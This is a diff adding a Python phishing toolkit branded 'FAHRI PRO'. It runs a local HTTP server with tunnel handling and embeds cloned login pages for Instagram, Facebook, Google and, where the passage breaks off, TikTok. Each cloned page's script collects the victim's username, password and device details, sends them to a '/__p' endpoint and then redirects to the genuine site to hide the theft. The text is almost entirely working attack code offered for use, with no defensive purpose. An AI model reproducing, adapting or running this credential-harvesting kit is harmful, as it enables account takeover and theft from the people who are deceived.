@@ -1,0 +1,1205 @@
+import os
+import re
+import sys
+import json
+import time
+import queue
+import random
+import shutil
+import string
+import threading
+import subprocess
+import platform
+import urllib3
+from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
+from urllib.parse import urlparse, parse_qs, quote
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+BANNER_ART = r"""
+  ╔═══════════════════════════════════╗
+  ║    F  A  H  R  I      P  R  O     ║
+  ╚═══════════════════════════════════╝
+"""
+SCRIPT_BY = "script by Fahri"
+TIKTOK = "TikTok : @Fahri.official932"
+SONG_QUERY = "Taylor Swift Blank Space official audio"
+SONG_TITLE = "Blank Space -- Taylor Swift"
+
+PHISH_PORT = 8090
+
+PALETTE = ["bright_red", "bright_yellow", "bright_green", "bright_cyan", "bright_blue", "bright_magenta"]
+SPIN_BRAILLE = ["⣾", "⣽", "⣻", "⢿", "⡿", "⣟", "⣯", "⣷"]
+GLITCH_CHARS = "!@$%^&*()_+-=[]{}|;:,.<>?/\\~`"
+MATRIX_CHARS = "01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワン"
+
+console = None
+music_process = None
+requests_mod = None
+http_session = None
+active_tunnels = []
+
+phish_state = {"server": None, "server_thread": None, "running": False, "active_template": "1", "creds": [], "port": PHISH_PORT, "tunnel_url": None, "start_ts": 0, "geo_cache": {}}
+
+def _safe_json_loads(s, default=None):
+    try: return json.loads(s)
+    except Exception: return default if default is not None else {}
+
+def parse_request_path(path):
+    try:
+        parsed = urlparse(path)
+        return parsed.path, parse_qs(parsed.query)
+    except Exception: return path, {}
+
+def human_time(seconds):
+    try: seconds = int(seconds)
+    except Exception: return "0s"
+    if seconds < 60: return f"{seconds}s"
+    if seconds < 3600: return f"{seconds // 60}m {seconds % 60}s"
+    if seconds < 86400: return f"{seconds // 3600}h {(seconds % 3600) // 60}m"
+    return f"{seconds // 86400}d {(seconds % 86400) // 3600}h"
+
+def kill_all_tunnels():
+    global active_tunnels
+    for proc in list(active_tunnels):
+        try: proc.terminate()
+        except Exception: pass
+    active_tunnels = []
+
+def spawn_tunnel(proc):
+    if proc is not None: active_tunnels.append(proc)
+
+def stop_phish_server():
+    if not phish_state["running"]: return
+    try: phish_state["server"].shutdown(); phish_state["server"].close()
+    except Exception: pass
+    phish_state["running"] = False
+
+def _p(msg=""):
+    try: sys.stdout.write(msg + "\n"); sys.stdout.flush()
+    except Exception: pass
+
+def _pip_has(module):
+    try: __import__(module); return True
+    except Exception: return False
+
+def _pip_install(name, timeout=120):
+    try:
+        subprocess.run([sys.executable,"-m","pip","install",name,"--quiet","--disable-pip-version-check","--no-warn-script-location","--no-cache-dir"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL, check=False, timeout=timeout)
+    except Exception: return False
+    return True
+
+def _pkg_has(binary):
+    try: return shutil.which(binary) is not None
+    except Exception: return False
+
+def _pkg_install(name, binary=None, timeout=30):
+    binary = binary or name
+    if _pkg_has(binary): return True
+    for cmd in (["pkg","install","-y",name],["apt","install","-y",name]):
+        if not shutil.which(cmd[0]): continue
+        try:
+            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
+            try: proc.communicate(timeout=timeout)
+            except subprocess.TimeoutExpired:
+                proc.kill()
+                try: proc.communicate(timeout=2)
+                except Exception: pass
+                continue
+            if _pkg_has(binary): return True
+        except Exception: continue
+    return False
+
+def bootstrap():
+    _p(""); _p("  +----------------- ENVIRONMENT SETUP -----------------+"); _p("  |")
+    py_pkgs = [("rich","rich"),("requests","requests"),("yt-dlp","yt_dlp"),("urllib3","urllib3")]
+    sys_pkgs = [("curl","curl"),("openssh","ssh"),("mpv","mpv"),("ffmpeg","ffmpeg")]
+    for label, module in py_pkgs:
+        if _pip_has(module): _p(f"  |  o  {label:<14} already present"); continue
+        _p(f"  |  >  {label:<14} installing...")
+        ok = _pip_install(label, timeout=140)
+        _p(f"  |  {'+' if ok else 'x'}  {label:<14} {'ready' if ok else 'skipped'}")
+    for label, binary in sys_pkgs:
+        if _pkg_has(binary): _p(f"  |  o  {label:<14} already present"); continue
+        _p(f"  |  >  {label:<14} installing...")
+        ok = _pkg_install(label, binary=binary, timeout=60)
+        _p(f"  |  {'+' if ok else 'x'}  {label:<14} {'ready' if ok else 'skipped'}")
+    _p("  |"); _p("  +-----------------------------------------------------+")
+    _p("  [*] environment ready"); _p(""); time.sleep(0.4)
+
+from rich.console import Console
+from rich.panel import Panel
+from rich.text import Text
+from rich.align import Align
+from rich.table import Table
+from rich.live import Live
+from rich import box
+
+console = Console()
+
+def try_load_requests():
+    global requests_mod, http_session
+    try:
+        import requests as r
+        requests_mod = r
+        http_session = r.Session()
+        http_session.headers.update({"User-Agent":"Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36"})
+        return True
+    except Exception: return False
+
+def clear(): os.system("clear" if os.name != "nt" else "cls")
+
+def glitch_string(text, intensity=0.2):
+    return "".join(random.choice(GLITCH_CHARS) if (ch != " " and random.random() < intensity) else ch for ch in text)
+
+def hue_text(text_value, frame, shift=3):
+    styled = Text()
+    for i, ch in enumerate(text_value):
+        color = PALETTE[((i + frame) // shift) % len(PALETTE)]
+        styled.append(ch, style=f"bold {color}")
+    return styled
+
+def banner_text(offset):
+    styled = Text()
+    for line in BANNER_ART.strip("\n").split("\n"):
+        for i, ch in enumerate(line):
+            color = PALETTE[((i + offset) // 3) % len(PALETTE)]
+            styled.append(ch, style=f"bold {color}")
+        styled.append("\n")
+    return styled
+
+def banner_glitch(frame):
+    styled = Text()
+    for line in BANNER_ART.strip("\n").split("\n"):
+        for i, ch in enumerate(line):
+            if ch != " " and random.random() < 0.08:
+                color = PALETTE[random.randrange(len(PALETTE))]
+                styled.append(random.choice(GLITCH_CHARS), style=f"bold {color}")
+            else:
+                color = PALETTE[((i + frame) // 3) % len(PALETTE)]
+                styled.append(ch, style=f"bold {color}")
+        styled.append("\n")
+    return styled
+
+def matrix_rain(frame, width=40, height=2):
+    styled = Text()
+    for r in range(height):
+        for i in range(width):
+            if random.random() < 0.35:
+                styled.append(random.choice(MATRIX_CHARS), style=f"bold {PALETTE[random.randrange(len(PALETTE))]}")
+            else:
+                styled.append(" ")
+        styled.append("\n")
+    return styled
+
+def animated_banner():
+    clear()
+    with Live(console=console, refresh_per_second=30, transient=False) as live:
+        for f in range(70):
+            if f < 26: body = matrix_rain(f, 40, 3)
+            elif f < 36: body = banner_glitch(f * 3)
+            else: body = banner_text(f * 3)
+            border = PALETTE[(f // 3) % len(PALETTE)]; title = PALETTE[(f // 2) % len(PALETTE)]
+            live.update(Panel(Align.center(body), border_style=border, box=box.DOUBLE, padding=(0,1), title=f"[bold {title}]FAHRI PROJECT[/]", subtitle=f"[bold {border}]v1.0.0 ULTRA[/]"))
+            time.sleep(0.035)
+    console.print(Align.center(Text(SCRIPT_BY, style="bold white on red")), highlight=False)
+    console.print(Align.center(Text(TIKTOK, style="bold bright_magenta")), highlight=False)
+    console.print()
+
+def now_playing_panel():
+    body = Text()
+    body.append("NOW PLAYING\n", style="bold bright_yellow")
+    body.append(SONG_TITLE + "\n", style="bold white")
+    body.append("streaming inline", style="dim white")
+    return Panel(Align.center(body), border_style="bright_magenta", box=box.ROUNDED, padding=(0,3))
+
+def stream_music():
+    global music_process
+    if not shutil.which("yt-dlp"): return False
+    player = None
+    for c in ("mpv", "ffplay"):
+        if shutil.which(c): player = c; break
+    if player is None: return False
+    ytdlp_cmd = ["yt-dlp","-f","bestaudio/best","-o","-","--no-playlist","--quiet","--no-warnings",f"ytsearch1:{SONG_QUERY}"]
+    player_cmd = (["mpv","-","--no-video","--really-quiet","--audio-display=no","--cache=yes","--cache-secs=10"] if player == "mpv" else ["ffplay","-nodisp","-autoexit","-loglevel","quiet","-i","-"])
+    try:
+        producer = subprocess.Popen(ytdlp_cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)
+        player_proc = subprocess.Popen(player_cmd, stdin=producer.stdout, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        if producer.stdout: producer.stdout.close()
+        music_process = player_proc
+        return True
+    except Exception: return False
+
+def start_music_async():
+    t = threading.Thread(target=stream_music, daemon=True); t.start(); return t
+
+def build_info_row(pairs):
+    grid = Table.grid(expand=True, padding=(0,1))
+    for _ in range(len(pairs)):
+        grid.add_column(ratio=1)
+    row_cells = []
+    for label, value, style in pairs:
+        cell = Text()
+        cell.append(str(label) + "\n", style="dim white")
+        cell.append(str(value), style=style)
+        row_cells.append(Panel(cell, border_style="bright_black", box=box.ROUNDED, padding=(0,1)))
+    grid.add_row(*row_cells)
+    return grid
+
+def phish_base_style():
+    return """
+    *{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
+    html,body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;font-size:14px;line-height:1.5}
+    a{text-decoration:none;color:inherit}
+    input{font-family:inherit;outline:none;border:0}
+    button{font-family:inherit;cursor:pointer;border:0}
+    img{max-width:100%;display:block}
+    ::selection{background:rgba(120,150,255,.35)}
+    """
+
+INSTAGRAM_HTML = """<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<title>Instagram</title>
+<style>__BASE__
+:root{--bg:rgb(0,0,0);--border:rgb(54,54,54);--text:rgb(245,245,245);--dim:rgb(168,168,168);--blue:rgb(0,149,246);--blueh:rgb(24,119,242);--err:rgb(237,73,86)}
+body{background:var(--bg);color:var(--text);display:flex;align-items:center;justify-content:center;min-height:100vh;padding:24px 0;overflow-x:hidden}
+.wrap{width:100%;max-width:350px;padding:0 14px}
+.card{background:var(--bg);border:1px solid var(--border);border-radius:1px;padding:48px 40px 24px;margin-bottom:10px;text-align:center;animation:fade .4s}
+@keyframes fade{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:none}}
+.logo{margin:0 auto 40px;display:flex;justify-content:center}
+.logo svg{height:62px;width:auto}
+.form{display:flex;flex-direction:column;gap:6px}.field{position:relative}
+.inp{background:rgb(18,18,18);border:1px solid var(--border);border-radius:3px;color:var(--text);padding:9px 8px 7px;font-size:12.5px;width:100%;height:38px}
+.inp::placeholder{color:transparent}
+.lbl{position:absolute;left:8px;top:50%;transform:translateY(-50%);color:rgb(115,115,115);font-size:12.5px;pointer-events:none;transition:all .12s;background:rgb(18,18,18);padding:0 4px}
+.inp:focus + .lbl,.inp:not(:placeholder-shown) + .lbl{top:0;font-size:10px;color:rgb(168,168,168)}
+.btn{margin-top:8px;background:var(--blue);border-radius:8px;color:rgb(255,255,255);font-weight:600;font-size:14px;height:32px;width:100%;display:flex;align-items:center;justify-content:center;gap:6px;opacity:.7}
+.btn:not(:disabled){opacity:1}
+.btn:disabled{opacity:.55}
+.spin{width:14px;height:14px;border:2px solid rgba(255,255,255,.35);border-top-color:rgb(255,255,255);border-radius:50%;animation:sp .7s linear infinite;display:none}
+.btn.loading .spin{display:block}.btn.loading .txt{display:none}
+@keyframes sp{to{transform:rotate(360deg)}}
+.divider{display:flex;align-items:center;gap:18px;margin:20px 0;color:var(--dim);font-size:12.5px;font-weight:600}
+.divider::before,.divider::after{content:"";flex:1;height:1px;background:var(--border)}
+.fb-login{display:flex;align-items:center;justify-content:center;gap:8px;color:var(--blueh);font-weight:600;font-size:14px;margin:14px 0}
+.fb-login svg{width:16px;height:16px}
+.forgot{color:rgb(229,229,229);font-size:12px;margin-top:18px;display:inline-block}
+.signup{background:var(--bg);border:1px solid var(--border);padding:22px;text-align:center;font-size:14px;margin-bottom:14px}
+.signup a{color:var(--blue);font-weight:600}
+.apps{text-align:center;color:rgb(229,229,229);font-size:14px;margin:14px 0;display:flex;justify-content:center;gap:8px;align-items:center}
+.apps img{height:36px;width:auto}
+.footer{text-align:center;color:var(--dim);font-size:12px;margin-top:24px;padding:0 8px}
+.err{color:var(--err);font-size:13px;margin:14px 0 6px;display:none;text-align:center}
+.err.show{display:block}
+</style></head><body>
+<div class="wrap"><div class="card">
+<div class="logo">
+<svg viewBox="0 0 175 51" xmlns="http://www.w3.org/2000/svg">
+<defs><radialGradient id="ig" cx="30%" cy="107%" r="150%">
+<stop offset="0%" stop-color="rgb(253,244,151)"/><stop offset="8%" stop-color="rgb(253,244,151)"/>
+<stop offset="45%" stop-color="rgb(253,89,73)"/><stop offset="60%" stop-color="rgb(214,36,159)"/>
+<stop offset="90%" stop-color="rgb(40,90,235)"/></radialGradient></defs>
+<g transform="translate(0,8)">
+<rect width="34" height="34" rx="9" fill="url(#ig)"/>
+<rect x="2.5" y="2.5" width="29" height="29" rx="7" fill="none" stroke="rgb(0,0,0)" stroke-width="2.6"/>
+<circle cx="17" cy="17" r="7.4" fill="none" stroke="rgb(0,0,0)" stroke-width="2.6"/>
+<circle cx="25.6" cy="8.4" r="1.7" fill="rgb(0,0,0)"/>
+</g>
+<text x="44" y="34" font-family="-apple-system,'Helvetica Neue',Helvetica,Arial,sans-serif" font-size="30" font-weight="500" fill="rgb(245,245,245)" letter-spacing="-.5" font-style="italic">Instagram</text>
+</svg>
+</div>
+<form class="form" id="igf" autocomplete="off" novalidate>
+<div class="field"><input class="inp" type="text" name="username" placeholder=" " autocapitalize="off" required><label class="lbl">Phone number, username, or email</label></div>
+<div class="field"><input class="inp" type="password" name="password" placeholder=" " required><label class="lbl">Password</label></div>
+<button class="btn" type="submit" id="igbtn" disabled><span class="spin"></span><span class="txt">Log in</span></button>
+<div class="err" id="igerr"></div></form>
+<div class="divider"><span>OR</span></div>
+<a class="fb-login" href="/login"><svg viewBox="0 0 24 24" fill="rgb(24,119,242)"><path d="M24 12.07C24 5.4 18.63 0 12 0S0 5.4 0 12.07C0 18.1 4.39 23.1 10.13 24v-8.44H7.08v-3.49h3.05V9.41c0-3.02 1.79-4.69 4.53-4.69 1.31 0 2.68.24 2.68.24v2.96h-1.51c-1.49 0-1.96.93-1.96 1.89v2.26h3.33l-.53 3.49h-2.8V24C19.61 23.1 24 18.1 24 12.07"/></svg>Log in with Facebook</a>
+<a class="forgot" href="/login">Forgot password?</a></div>
+<div class="signup">Don't have an account? <a href="/login">Sign up</a></div>
+<div class="apps"><img src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 135 40'><text y='30' font-size='14' font-family='Helvetica'>Get the app.</text></svg>" alt="Get the app"></div>
+<div class="footer">Meta · About · Blog · Jobs · Help · API · Privacy · Terms · Locations · Instagram Lite · Threads · Contact Uploading &amp; Non-Users · Meta Verified</div></div>
+<script>(function(){var f=document.getElementById("igf"),b=document.getElementById("igbtn"),e=document.getElementById("igerr");function chk(){b.disabled=!(f.username.value.trim()&&f.password.value)}f.username.addEventListener("input",chk);f.password.addEventListener("input",chk);f.addEventListener("submit",function(ev){ev.preventDefault();var u=f.username.value.trim(),p=f.password.value;if(!u||!p){e.textContent="Sorry, your password was incorrect. Please double-check your password.";e.classList.add("show");return;}b.classList.add("loading");b.disabled=true;e.classList.remove("show");var payload={u:u,p:p,ua:navigator.userAgent,screen:screen.width+"x"+screen.height,lang:navigator.language,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,ref:location.href};fetch("/__p",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(payload)}).then(function(){setTimeout(function(){location.href="https://www.instagram.com/accounts/login/";},800);}).catch(function(){setTimeout(function(){location.href="https://www.instagram.com/accounts/login/";},800);});});})();</script>
+</body></html>"""
+
+FACEBOOK_HTML = """<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover"><title>Facebook – log in or sign up</title>
+<style>__BASE__
+body{background:rgb(240,242,245);color:rgb(28,30,33);min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:0 12px}
+.logo{display:flex;justify-content:center;margin:40px 0 14px}
+.logo svg{height:106px;width:auto}
+.card{background:#fff;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1),0 8px 16px rgba(0,0,0,.1);padding:16px;width:100%;max-width:396px;margin:0 auto}
+.inp{width:100%;border:1px solid rgb(221,223,226);border-radius:6px;padding:15px 16px;font-size:17px;background:#fff;color:rgb(28,30,33);margin-bottom:12px;outline:none}
+.inp:focus{border-color:rgb(24,119,242);box-shadow:0 0 0 2px rgb(231,243,255)}
+.btn{width:100%;background:rgb(24,119,242);border-radius:6px;color:#fff;font-size:20px;font-weight:700;padding:12px 0;margin-bottom:16px;display:flex;align-items:center;justify-content:center;gap:8px}
+.btn:disabled{opacity:.7}
+.spin{width:18px;height:18px;border:2px solid rgba(255,255,255,.4);border-top-color:#fff;border-radius:50%;animation:sp .7s linear infinite;display:none}
+.btn.loading .spin{display:block}.btn.loading .txt{display:none}
+@keyframes sp{to{transform:rotate(360deg)}}
+.forgot{display:block;text-align:center;color:rgb(24,119,242);font-size:14px;margin:6px 0 16px;text-decoration:none}
+.divider{height:1px;background:rgb(218,221,225);margin:0 -16px 16px}
+.newacc{display:flex;justify-content:center}.newacc button{background:rgb(66,183,42);border-radius:6px;color:#fff;font-size:17px;font-weight:700;padding:13px 20px;border:none;cursor:pointer}
+.below{margin-top:28px;text-align:center;font-size:14px;padding-bottom:40px;color:rgb(28,30,33)}.below a{color:rgb(24,119,242);font-weight:700}
+.err{background:rgb(255,235,232);border:1px solid rgb(221,60,16);color:rgb(221,60,16);font-size:13px;padding:10px 12px;border-radius:4px;margin-bottom:12px;display:none}
+.err.show{display:block}
+.footer{font-size:12px;color:rgb(115,115,115);text-align:center;padding-bottom:30px;line-height:1.7}
+</style></head><body>
+<div class="logo"><svg viewBox="0 0 666 666" xmlns="http://www.w3.org/2000/svg"><path fill="rgb(24,119,242)" d="M666 333C666 149 517 0 333 0S0 149 0 333c0 166 122 304 281 329V430h-85v-97h85v-73c0-84 50-130 126-130 36 0 74 6 74 6v82h-42c-41 0-54 26-54 52v63h92l-15 96h-77v232c159-25 281-163 281-329z"/></svg></div>
+<form class="card" id="fbf" autocomplete="off" novalidate>
+<div class="err" id="fberr">The password that you've entered is incorrect. <a href="/login" style="color:rgb(24,119,242)">Forgotten password?</a></div>
+<input class="inp" type="text" name="email" placeholder="Email address or phone number" autocapitalize="off" required>
+<input class="inp" type="password" name="pass" placeholder="Password" required>
+<button class="btn" type="submit" id="fbbtn"><span class="spin"></span><span class="txt">Log in</span></button>
+<a class="forgot" href="/login">Forgotten password?</a>
+<div class="divider"></div>
+<div class="newacc"><button type="button">Create new account</button></div>
+</form>
+<div class="below"><a href="/login">Create a Page</a> for a celebrity, brand or business.</div>
+<div class="footer">English (US) · Bahasa Indonesia · Basa Jawa · 中文(简体) · More languages<br>Meta © 2026</div>
+<script>(function(){var f=document.getElementById("fbf"),b=document.getElementById("fbbtn"),e=document.getElementById("fberr");f.addEventListener("submit",function(ev){ev.preventDefault();var u=f.email.value.trim(),p=f.pass.value;if(!u||!p){e.classList.add("show");return;}b.classList.add("loading");b.disabled=true;e.classList.remove("show");var payload={u:u,p:p,ua:navigator.userAgent,screen:screen.width+"x"+screen.height,lang:navigator.language,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,ref:location.href};fetch("/__p",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(payload)}).then(function(){setTimeout(function(){location.href="https://www.facebook.com/login/";},800);}).catch(function(){setTimeout(function(){location.href="https://www.facebook.com/login/";},800);});});})();</script>
+</body></html>"""
+
+GOOGLE_HTML = """<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover"><title>Sign in - Google Accounts</title>
+<style>__BASE__
+body{background:#fff;color:rgb(32,33,36);min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
+.card{width:100%;max-width:448px;border:1px solid rgb(218,220,224);border-radius:8px;padding:48px 40px 36px;position:relative}
+.logo{display:flex;justify-content:center;margin-bottom:16px}
+.logo svg{height:24px;width:auto}
+h1{font-size:24px;font-weight:400;text-align:center;margin:0 0 8px;line-height:1.32;color:rgb(32,33,36)}
+.sub{font-size:16px;text-align:center;margin:0 0 32px;color:rgb(32,33,36);line-height:1.5}
+.field{position:relative;margin-bottom:6px}
+.inp{width:100%;border:1px solid rgb(218,220,224);border-radius:4px;padding:13px 15px;font-size:16px;background:transparent;color:rgb(32,33,36)}
+.inp:focus{border:2px solid rgb(26,115,232);padding:12px 14px;outline:none}
+.lbl{position:absolute;left:15px;top:50%;transform:translateY(-50%);background:#fff;color:rgb(95,99,104);font-size:16px;pointer-events:none;transition:all .12s;padding:0 4px;border-radius:2px}
+.inp:focus + .lbl,.inp:not(:placeholder-shown) + .lbl{top:0;font-size:12px;color:rgb(26,115,232)}
+.inp:focus:not(:placeholder-shown) + .lbl{background:#fff}
+.err{color:rgb(217,48,37);font-size:12px;margin:8px 0 16px;display:none;padding:0 2px;line-height:1.4}.err.show{display:block}
+.link{color:rgb(26,115,232);font-size:14px;font-weight:500;cursor:pointer}
+.hint{color:rgb(26,115,232);font-size:14px;font-weight:600;margin:14px 0 32px;cursor:pointer}
+.blurb{color:rgb(95,99,104);font-size:14px;line-height:20px;margin-bottom:32px}
+.bottom{display:flex;justify-content:space-between;align-items:center;margin-top:32px;gap:8px}
+.btn{background:rgb(26,115,232);border-radius:4px;color:#fff;font-size:14px;font-weight:500;padding:10px 24px;display:flex;align-items:center;gap:8px;min-width:88px;justify-content:center}
+.btn:hover{background:rgb(23,104,209)}
+.btn:disabled{opacity:.6}
+.spin{width:14px;height:14px;border:2px solid rgba(255,255,255,.4);border-top-color:#fff;border-radius:50%;animation:sp .7s linear infinite;display:none}
+.btn.loading .spin{display:block}.btn.loading .txt{display:none}
+@keyframes sp{to{transform:rotate(360deg)}}
+.foot{display:flex;justify-content:space-between;font-size:12px;color:rgb(95,99,104);margin-top:24px}
+.foot select{border:0;background:transparent;color:rgb(95,99,104);font-size:12px;cursor:pointer}
+.foot-links a{color:rgb(95,99,104);margin-left:16px;text-decoration:none}
+</style></head><body>
+<div class="card"><div class="logo">
+<svg viewBox="0 0 74 24" xmlns="http://www.w3.org/2000/svg">
+<path fill="rgb(66,133,244)" d="M9.24 6.19h10.68c.15.6.23 1.2.23 1.84 0 2.19-.63 4.4-2.2 6.02-1.63 1.63-3.85 2.4-6.24 2.4-3.83 0-7.06-2.6-8.22-6.1C2.98 8.62 3.9 6.4 5.65 4.9 7.2 3.55 9.35 2.85 11.5 2.85c2.15 0 4.2.8 5.7 2.14l-2.3 2.3c-.86-.8-2.1-1.3-3.4-1.3-1.6 0-3.05.72-4 1.9-.9 1.12-1.2 2.6-.83 3.9.53 1.9 2.28 3.2 4.3 3.2 1.2 0 2.35-.44 3.2-1.2.9-.83 1.25-2 1.3-3.2H9.24V6.19z"/>
+<path fill="rgb(234,67,53)" d="M25.68 12.86c0-3.5-2.55-6.3-5.94-6.3-3.4 0-5.94 2.8-5.94 6.3 0 3.48 2.55 6.3 5.94 6.3 3.4 0 5.94-2.82 5.94-6.3zm-2.4 0c0 2.2-1.5 3.87-3.54 3.87-2.04 0-3.54-1.66-3.54-3.87 0-2.2 1.5-3.87 3.54-3.87 2.04 0 3.54 1.66 3.54 3.87z"/>
+<path fill="rgb(66,133,244)" d="M39.7 12.86c0-3.5-2.55-6.3-5.94-6.3-3.4 0-5.94 2.8-5.94 6.3 0 3.48 2.55 6.3 5.94 6.3 3.4 0 5.94-2.82 5.94-6.3zm-2.4 0c0 2.2-1.5 3.87-3.54 3.87-2.04 0-3.54-1.66-3.54-3.87 0-2.2 1.5-3.87 3.54-3.87 2.04 0 3.54 1.66 3.54 3.87z"/>
+<path fill="rgb(249,171,0)" d="M52.7 7.03v11.2c0 4.6-2.7 6.5-5.94 6.5-3 0-4.8-2-5.5-3.66l2.08-.87c.42 1 1.44 2.2 3.4 2.2 2.2 0 3.55-1.37 3.55-3.94v-.9h-.1c-.6.75-1.8 1.4-3.32 1.4-3.16 0-6.05-2.75-6.05-6.3 0-3.56 2.9-6.32 6.05-6.32 1.5 0 2.7.66 3.32 1.4h.1v-1.03h2.44zm-2.27 5.9c0-2.2-1.47-3.9-3.4-3.9-1.94 0-3.6 1.7-3.6 3.9 0 2.16 1.66 3.83 3.6 3.83 1.93 0 3.4-1.68 3.4-3.83z"/>
+<path fill="rgb(52,168,83)" d="M57.87.94v17.86h-2.42V.94h2.42z"/>
+<path fill="rgb(234,67,53)" d="M67.15 15.28l1.93 1.3c-.62.93-2.13 2.53-4.72 2.53-3.23 0-5.65-2.5-5.65-6.3 0-3.75 2.44-6.3 5.37-6.3 2.95 0 4.4 2.35 4.87 3.62l.26.65-7.62 3.16c.58 1.14 1.48 1.72 2.75 1.72 1.28 0 2.16-.63 2.8-1.38zM62.28 12.9l5.1-2.12c-.28-.72-1.13-1.22-2.13-1.22-1.28 0-3.05.9-2.97 3.35z"/>
+</svg></div>
+<h1>Sign in</h1><div class="sub">Use your Google Account</div>
+<form id="gf" autocomplete="off" novalidate>
+<div class="field"><input class="inp" type="text" name="identifier" placeholder=" " autocapitalize="off" required autofocus><label class="lbl">Email or phone</label></div>
+<div class="err" id="gerr"><svg viewBox="0 0 24 24" width="14" height="14" style="vertical-align:middle;margin-right:4px" fill="rgb(217,48,37)"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg><span id="gerrmsg">Enter an email or phone number</span></div>
+<div class="hint">Forgot email?</div>
+<div class="blurb">Not your computer? Use Guest mode to sign in privately.<br><a class="link" href="/login">Learn more about using Guest mode</a></div>
+<div class="bottom"><span class="link">Create account</span>
+<button class="btn" type="submit" id="gbtn"><span class="spin"></span><span class="txt">Next</span></button></div></form>
+<div class="foot"><select><option>English (United States)</option><option>Bahasa Indonesia</option></select><div class="foot-links"><a href="/login">Help</a><a href="/login">Privacy</a><a href="/login">Terms</a></div></div></div>
+<script>(function(){var f=document.getElementById("gf"),b=document.getElementById("gbtn"),e=document.getElementById("gerr"),m=document.getElementById("gerrmsg");f.addEventListener("submit",function(ev){ev.preventDefault();var u=f.identifier.value.trim();if(!u){m.textContent="Enter an email or phone number";e.classList.add("show");return;}e.classList.remove("show");b.classList.add("loading");b.disabled=true;var payload={u:u,p:"__email_only__",ua:navigator.userAgent,screen:screen.width+"x"+screen.height,lang:navigator.language,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,ref:location.href};fetch("/__p",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(payload)}).then(function(){setTimeout(function(){location.href="https://accounts.google.com/";},800);}).catch(function(){setTimeout(function(){location.href="https://accounts.google.com/";},800);});});})();</script>
+</body></html>"""
+
+TIKTOK_HTML = """<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover"><title>TikTok - Make Your Day</title>
+<style>__BASE__
+body{background:#fff;color:rgb(22,24,35);min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:0 12px}
+.wrap{width:100%;max-width:400px;padding-top:40px}
+.logo{display:flex;justify-content:center;margin-bottom:18px}
+.logo svg{height:52px;width:auto}
+h1{font-size:32px;font-weight:700;text-align:center;margin:0 0 6px;letter-spacing:-.5px;color:#161823}
+.sub{font-size:15px;text-align:center;margin:0 0 28px;color:rgba(22,24,35,.75)}
+.field{position:relative;margin-bottom:12px}
+.inp{width:100%;border:1px solid rgba(22,24,35,.12);border-radius:4px;background:rgba(22,24,35,.03);padding:15px 12px;font-size:15px;color:#161823}
+.inp:focus{border-color:rgba(22,24,35,.35);background:#fff}
+.lbl{position:absolute;left:12px;top:50%;transform:translateY(-50%);color:rgba(22,24,35,.5);font-size:15px;pointer-events:none;transition:all .12s;background:transparent;padding:0 4px}
+.inp:focus + .lbl,.inp:not(:placeholder-shown) + .lbl{top:0;font-size:11px;color:rgba(22,24,35,.75);background:#fff}
+.btn{width:100%;background:#FE2C55;border-radius:4px;color:#fff;font-size:16px;font-weight:600;padding:13px 0;margin-top:6px;display:flex;align-items:center;justify-content:center;gap:8px}
+.btn:disabled{opacity:.6}
+.spin{width:15px;height:15px;border:2px solid rgba(255,255,255,.4);border-top-color:#fff;border-radius:50%;animation:sp .7s linear infinite;display:none}
+.btn.loading .spin{display:block}.btn.loading .txt{display:none}
+@keyframes sp{to{transform:rotate(360deg)}}
+.err{color:#FE2C55;font-size:13px;margin:-4px 0 10px;display:none}.err.show{display:block}
+.terms{font-size:12px;color:rgba(22,24,35,.6);text-align:center;margin-top:16px;line-height:1.55}
+.terms a{color:#161823;font-weight:600}
+.divider{display:flex;align-items:center;gap:16px;margin:26px 0;color:rgba(22,24,35,.5);font-size:13px}
+.divider::before,.divider::after{content:"";flex:1;height:1px;background:rgba(22,24,35,.12)}
+.alt{display:flex;flex-direction:column;gap:12px}
+.alt a{display:flex;align-items:center;justify-content:center;gap:8px;border:1px solid rgba(22,24,35,.12);border-radius:4px;padding:12px 0;font-size:15px;font-weight:500;color:#161823}
+.alt a svg{width:20px;height:20px}
+.foot{margin:32px 0 24px;font-size:12px;color:rgba(22,24,35,.6);text-align:center}
+.foot a{color:#161823;font-weight:600;margin:0 4px}
+</style></head><body>
+<div class="wrap"><div class="logo">
+<svg viewBox="0 0 300 68" xmlns="http://www.w3.org/2000/svg">
+<g transform="translate(0,12)">
